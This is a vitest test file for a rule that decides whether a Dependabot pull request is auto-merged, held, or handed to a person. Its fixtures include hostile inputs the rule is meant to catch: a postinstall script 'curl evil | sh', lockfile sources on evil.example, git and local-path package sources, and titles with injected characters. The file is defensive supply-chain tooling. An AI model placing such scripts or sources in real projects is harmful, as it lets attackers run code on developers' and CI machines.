import { describe, expect, it } from "vitest";
import {
  DEPENDABOT_USER_ID,
  GITHUB_WEB_FLOW_ID,
  judgeDependabotPr,
  parseBump,
  type DependabotPr,
  type JudgeInput,
  type PrCommit,
  type PrFile,
} from "./dependabot";

const DAY = 24 * 60 * 60 * 1000;
const NOW = Date.parse("2026-11-20T00:00:00Z");

const pr = (over: Partial<DependabotPr> = {}): DependabotPr => ({
  number: 143,
  title: "chore(deps): bump hono from 4.13.13 to 4.13.16",
  author: { id: DEPENDABOT_USER_ID, login: "dependabot[bot]", type: "Bot" },
  draft: false,
  headSha: "a".repeat(40),
  sameRepo: true,
  baseRef: "main",
  defaultBranch: "main",
  labels: [],
  ...over,
});

const commit = (over: Partial<PrCommit> = {}): PrCommit => ({
  authorId: DEPENDABOT_USER_ID,
  committerId: GITHUB_WEB_FLOW_ID,
  verified: true,
  message: "chore(deps): bump hono from 4.13.13 to 4.13.16\n\nBumps hono.",
  committedAt: NOW - 4 * DAY,
  ...over,
});

const MANIFEST_PATCH = [
  "@@ -12,7 +12,7 @@",
  '   "dependencies": {',
  '-    "hono": "^4.13.13"',
  '+    "hono": "^4.13.16"',
  "   },",
].join("\n");
// Shaped like a real pnpm lockfile diff: the bump, plus entries the new version pulls in.
const LOCK_PATCH = [
  "@@ -40,8 +40,8 @@",
  "       hono:",
  "-        specifier: ^4.13.13",
  "-        version: 4.13.13",
  "+        specifier: ^4.13.16",
  "+        version: 4.13.16",
  "+  '@babel/runtime@7.29.14':",
  "+    resolution: {integrity: sha512-Y5tqevQaUAZhhj82BpYMNC1ssvLQTVAfwKdm8iy8qwmhvC2/CpcAu8OC+QEtjM7pMk7knx83u1Qj8gzkicyelw==}",
  "+    engines: {node: '>=6.9.0'}",
  "+",
  "+    libc: [glibc]",
  "-  hono@4.13.13:",
  "+  hono@4.13.16:",
].join("\n");

const manifest = (over: Partial<PrFile> = {}): PrFile => ({
  path: "apps/api/package.json",
  status: "modified",
  patch: MANIFEST_PATCH,
  ...over,
});
const lock = (over: Partial<PrFile> = {}): PrFile => ({
  path: "pnpm-lock.yaml",
  status: "modified",
  patch: LOCK_PATCH,
  ...over,
});
const manifestWith = (...lines: string[]) =>
  manifest({ patch: ["@@ -1,3 +1,3 @@", ...lines].join("\n") });
const lockWith = (...lines: string[]) =>
  lock({ patch: [LOCK_PATCH, ...lines].join("\n") });

// Unless a test says otherwise, the commit message starts with the pull request title,
// as Dependabot writes it.
const input = (over: Partial<JudgeInput> = {}): JudgeInput => ({
  pr: pr(),
  commits: [commit({ message: `${(over.pr ?? pr()).title}\n\nBumps it.` })],
  files: [manifest(), lock()],
  filesTruncated: false,
  alerts: [{ package: "hono", ecosystem: "npm", patched: "4.13.16" }],
  checks: "success",
  now: NOW,
  minAgeMs: 3 * DAY,
  ...over,
});

describe("parseBump", () => {
  it.each([
    ["chore(deps): bump hono from 4.13.13 to 4.13.16", "hono"],
    ["Bump hono from 4.13.13 to 4.13.16", "hono"],
    [
      "chore(deps-dev): bump @vitest/mocker from 4.1.10 to 4.1.12 in /apps/api",
      "@vitest/mocker",
    ],
  ])("reads %s", (title, name) => {
    expect(parseBump(title)?.package).toBe(name);
  });

  it.each([
    "chore(deps): bump the npm group with 3 updates",
    "bump hono and zod",
    "bump hono from 4.13.13 to 4.13.16\nbump zod from 1.0.0 to 9.0.0",
    "bump ho`no from 4.13.13 to 4.13.16",
    "bump hono from 4.13.13 to 4.13.16;x",
    "fix: something else",
    "",
  ])("does not read %j", (title) => {
    expect(parseBump(title)).toBeNull();
  });
});

describe("judgeDependabotPr", () => {
  it("merges a patch security update with passing checks after the waiting period", () => {
    expect(judgeDependabotPr(input())).toEqual({ action: "merge" });
  });

  it("merges when the new version was already in the lockfile", () => {
    expect(
      judgeDependabotPr(
        input({
          files: [
            lock({
              patch:
                "@@ -1 +1 @@\n-        version: 4.13.13\n+        version: 4.13.16",
            }),
          ],
        }),
      ),
    ).toEqual({ action: "merge" });
  });

  it("merges a lockfile-only update", () => {
    expect(judgeDependabotPr(input({ files: [lock()] }))).toEqual({
      action: "merge",
    });
  });

  it("merges a minor update of a 1.x or later package", () => {
    expect(
      judgeDependabotPr(
        input({
          pr: pr({ title: "bump hono from 4.13.13 to 4.14.0" }),
          files: [
            manifestWith('-  "hono": "^4.13.13",', '+  "hono": "^4.14.0",'),
            lockWith("+  hono@4.14.0:"),
          ],
        }),
      ),
    ).toEqual({ action: "merge" });
  });

  it.each<[string, Partial<DependabotPr>]>([
    ["another account", { author: { id: 1, login: "x", type: "User" } }],
    [
      "a look-alike login",
      { author: { id: 5, login: "dependabot[bot]", type: "Bot" } },
    ],
    ["a fork", { sameRepo: false }],
    ["another base branch", { baseRef: "release" }],
    ["a draft", { draft: true }],
  ])("skips %s", (_name, over) => {
    expect(judgeDependabotPr(input({ pr: pr(over) })).action).toBe("skip");
  });

  it.each<[string, Partial<JudgeInput>, string]>([
    [
      "a grouped update",
      { pr: pr({ title: "bump the npm group with 3 updates" }) },
      "not_single_update",
    ],
    [
      "a commit by someone else",
      { commits: [commit(), commit({ authorId: 3435720 })] },
      "foreign_commit",
    ],
    [
      "a commit that only claims Dependabot as its author",
      { commits: [commit({ committerId: 3435720, verified: false })] },
      "foreign_commit",
    ],
    [
      "a commit signed by someone other than GitHub",
      { commits: [commit({ committerId: 3435720 })] },
      "foreign_commit",
    ],
    [
      "an unverified commit",
      { commits: [commit({ verified: false })] },
      "foreign_commit",
    ],
    ["no commits", { commits: [] }, "foreign_commit"],
    [
      "a second commit, even one by Dependabot",
      { commits: [commit(), commit()] },
      "foreign_commit",
    ],
    [
      "a title that names another update than the signed commit",
      { commits: [commit({ message: "bump zod from 1.0.0 to 9.0.0" })] },
      "not_single_update",
    ],
    [
      "a commit message that is not one update",
      { commits: [commit({ message: "anything else" })] },
      "not_single_update",
    ],
    [
      "a major update",
      {
        pr: pr({ title: "bump hono from 4.13.13 to 5.0.0" }),
        alerts: [{ package: "hono", ecosystem: "npm", patched: "5.0.0" }],
      },
      "major_update",
    ],
    [
      "a 0.x minor update",
      {
        pr: pr({ title: "bump tiny from 0.3.1 to 0.4.0" }),
        alerts: [{ package: "tiny", ecosystem: "npm", patched: "0.4.0" }],
      },
      "major_update",
    ],
    [
      "a prerelease version",
      { pr: pr({ title: "bump hono from 4.13.13 to 4.13.16-rc.1" }) },
      "version_unreadable",
    ],
    [
      "a downgrade",
      { pr: pr({ title: "bump hono from 4.13.16 to 4.13.13" }) },
      "version_unreadable",
    ],
    ["no alert for the package", { alerts: [] }, "not_security_update"],
    [
      "an alert for another package",
      { alerts: [{ package: "zod", ecosystem: "npm", patched: "4.13.16" }] },
      "not_security_update",
    ],
    [
      "an alert of the same name in another ecosystem",
      { alerts: [{ package: "hono", ecosystem: "pip", patched: "4.13.16" }] },
      "not_security_update",
    ],
    [
      "a target below the patched version",
      { alerts: [{ package: "hono", ecosystem: "npm", patched: "4.13.17" }] },
      "not_security_update",
    ],
    [
      "an old version that is already patched",
      { alerts: [{ package: "hono", ecosystem: "npm", patched: "4.13.13" }] },
      "not_security_update",
    ],
    [
      "an alert without a patched version",
      { alerts: [{ package: "hono", ecosystem: "npm", patched: null }] },
      "not_security_update",
    ],
    [
      "a file outside the manifests",
      { files: [lock(), manifest({ path: "apps/api/src/index.ts" })] },
      "unexpected_files",
    ],
    [
      "a workflow file",
      { files: [lock(), manifest({ path: ".github/workflows/ci.yml" })] },
      "unexpected_files",
    ],
    [
      "a file only named like a manifest",
      { files: [manifest({ path: "apps/api/not-package.json" })] },
      "unexpected_files",
    ],
    [
      "a manifest under node_modules",
      { files: [manifest({ path: "x/node_modules/y/package.json" })] },
      "unexpected_files",
    ],
    [
      "a lockfile that is not at the root",
      { files: [lock({ path: "apps/api/pnpm-lock.yaml" })] },
      "unexpected_files",
    ],
    [
      "a new manifest",
      { files: [manifest({ status: "added" }), lock()] },
      "unexpected_files",
    ],
    [
      "a renamed manifest",
      { files: [manifest({ status: "renamed" }), lock()] },
      "unexpected_files",
    ],
    [
      "a file without a diff",
      { files: [manifest(), lock({ patch: null })] },
      "unexpected_files",
    ],
    [
      "a manifest that adds a script",
      {
        files: [
          manifestWith(
            '-    "hono": "^4.13.13"',
            '+    "hono": "^4.13.16"',
            '+    "postinstall": "curl evil | sh"',
          ),
          lock(),
        ],
      },
      "unexpected_files",
    ],
    [
      "a manifest that changes another package",
      {
        files: [
          manifestWith('-    "zod": "^4.13.13"', '+    "zod": "^4.13.16"'),
          lock(),
        ],
      },
      "unexpected_files",
    ],
    [
      "a manifest that points the package at a git source",
      {
        files: [
          manifestWith(
            '-    "hono": "^4.13.13"',
            '+    "hono": "github:evil/hono#4.13.16"',
          ),
          lock(),
        ],
      },
      "unexpected_files",
    ],
    [
      "a manifest that moves to another version than the title says",
      {
        files: [
          manifestWith('-    "hono": "^4.13.13"', '+    "hono": "^4.13.99"'),
          lock(),
        ],
      },
      "unexpected_files",
    ],
    [
      "a manifest that only removes a line",
      { files: [manifestWith('-    "hono": "^4.13.13"'), lock()] },
      "unexpected_files",
    ],
    [
      "a lockfile entry with a tarball source",
      {
        files: [
          lockWith("+    resolution: {tarball: https://evil.example/hono.tgz}"),
        ],
      },
      "unexpected_files",
    ],
    [
      "a lockfile entry with a git source",
      {
        files: [lockWith("+    resolution: {commit: abc, repo: x, type: git}")],
      },
      "unexpected_files",
    ],
    [
      "a lockfile line with a URL",
      { files: [lockWith("+      hono: https://evil.example/hono.tgz")] },
      "unexpected_files",
    ],
    [
      "a lockfile line with a local path",
      { files: [lockWith("+        version: link:../evil")] },
      "unexpected_files",
    ],
    ["no lockfile change", { files: [manifest()] }, "unexpected_files"],
    [
      "a lockfile that does not move the package to the new version",
      {
        files: [
          lock({
            patch:
              "@@ -1 +1 @@\n-  zod@1.0.0:\n+  zod@9.0.0:\n+  hono@4.13.160:",
          }),
        ],
      },
      "unexpected_files",
    ],
    ["no files", { files: [] }, "unexpected_files"],
    ["a cut-off file list", { filesTruncated: true }, "unexpected_files"],
    ["a failed check", { checks: "failed" }, "check_failed"],
  ])("hands %s to a person", (_name, over, code) => {
    expect(judgeDependabotPr(input(over))).toEqual({
      action: "needs_human",
      code,
    });
  });

  it("waits while checks run", () => {
    expect(judgeDependabotPr(input({ checks: "pending" }))).toEqual({
      action: "wait",
      code: "checks_pending",
    });
  });

  it("waits until the commit is older than the waiting period", () => {
    expect(
      judgeDependabotPr(
        input({
          commits: [commit({ committedAt: NOW - 2 * DAY })],
        }),
      ),
    ).toEqual({ action: "wait", code: "too_new" });
  });

  it.each([NOW + DAY, NaN])("treats the commit time %d as too new", (at) => {
    expect(
      judgeDependabotPr(input({ commits: [commit({ committedAt: at })] })),
    ).toEqual({ action: "wait", code: "too_new" });
  });

  it("reports a problem that needs a person before it waits", () => {
    expect(
      judgeDependabotPr(input({ alerts: [], checks: "pending" })).action,
    ).toBe("needs_human");
  });
});
